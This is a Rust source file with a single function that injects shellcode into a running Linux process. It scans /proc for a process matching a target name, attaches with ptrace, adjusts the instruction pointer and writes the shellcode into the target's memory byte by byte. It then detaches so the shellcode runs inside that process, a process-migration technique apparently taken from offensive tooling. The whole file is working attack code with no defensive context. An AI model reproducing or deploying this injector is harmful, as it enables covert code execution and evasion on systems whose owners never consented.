use nix::sys::ptrace::{attach, detach, getregs, setregs, write};
use nix::sys::wait::{waitpid, WaitPidFlag};
use nix::unistd::Pid;
use std::ffi::c_void;
use std::process::{self, Command};

pub fn inject_and_migrate(shellcode: &[u8], target_process: &str) {
    // List and collect all of the PIDs of active processes
    let list_pids = Command::new("ls").arg("/proc/").output().unwrap();
    let mut pids: Vec<i32> = String::from_utf8(list_pids.stdout)
        .unwrap()
        .split('\n')
        .flat_map(|s| s.parse().ok())
        .collect();

    // Throw away anything under 100 to try to limit the chances you crash the machine
    pids.retain(|i| *i > 100 && *i != process::id() as i32);
    // Find a PID that corresponds to an instance of the target process and that ptrace can attach to
    let mut target_pid = 0;
    for pid in pids.iter().rev() {
        let cmdline = format!("/proc/{pid}/cmdline");
        let commandline = Command::new("cat").arg(cmdline).output().unwrap().stdout;
        if String::from_utf8(commandline)
            .unwrap()
            .contains(target_process)
            && attach(Pid::from_raw(*pid)).is_ok()
        {
            target_pid = *pid;
            break;
        };
    }
    if target_pid == 0 {
        panic!("Could not find a {target_process} process whose memory can be manipulated");
    }

    // Wait for the process to change to a stopped state, then dump registers
    let target_pid = Pid::from_raw(target_pid);
    if let Err(error) = waitpid(target_pid, Some(WaitPidFlag::WUNTRACED)) {
        panic!("Could not wait for the {target_process} to change state: {error}");
    }

    // Dump the registers for the target process
    let mut registers = match getregs(target_pid) {
        Ok(value) => value,
        Err(error) => panic!("Could not get registers for {target_process}: {error}"),
    };

    // Copy the RIP register to a mutable variable, then increment RIP by 2
    let mut point = registers.rip;
    registers.rip += 2;

    // Write the updated RIP back to the target process
    if let Err(error) = setregs(target_pid, registers) {
        panic!("Unable to reset {target_process} registers: {error}");
    }

    // Write shellcode to target process one byte at a time
    for byte in shellcode {
        if let Err(error) = write(target_pid, point as *mut c_void, *byte as i64)
        {
            panic!("Unable to write portion of shellcode at {byte} to {target_process}: {error}");
        }
        point += 1;
    }

    // Detach from the process so it can resume execution
    if let Err(error) = detach(target_pid, None) {
        panic!("Unable to detach from {target_process}: {error}");
    }
}
